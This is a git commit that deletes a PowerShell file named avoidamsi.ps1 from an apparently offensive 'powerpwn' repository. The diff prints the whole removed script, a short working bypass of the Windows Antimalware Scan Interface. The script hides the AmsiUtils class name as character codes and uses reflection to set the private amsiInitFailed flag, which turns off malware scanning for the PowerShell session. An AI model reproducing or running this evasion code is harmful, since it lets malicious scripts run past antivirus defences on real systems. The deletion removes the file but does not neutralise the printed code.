49db1b1e42b5983388867c094a288ee7764a0154
paulkwalton <43542501+paulkwalton@users.noreply.github.com>
2025-03-26 09:25:31 +0000

    Delete powerpwn/avoidamsi.ps1

--- powerpwn/avoidamsi.ps1
+++
@@ -1,7 +0,0 @@
-$n = [string]::Join('',([char[]](83,121,115,116,101,109,46,77,97,110,97,103,101,109,101,110,116,46,65,117,116,111,109,97,116,105,111,110,46,65,109,115,105,85,116,105,108,115)))
-
-$c = [Ref].Assembly.GetType($n)
-
-$f = $c.GetField("amsiInitFailed", "NonPublic,Static")
-
-$f.SetValue($null, $true)
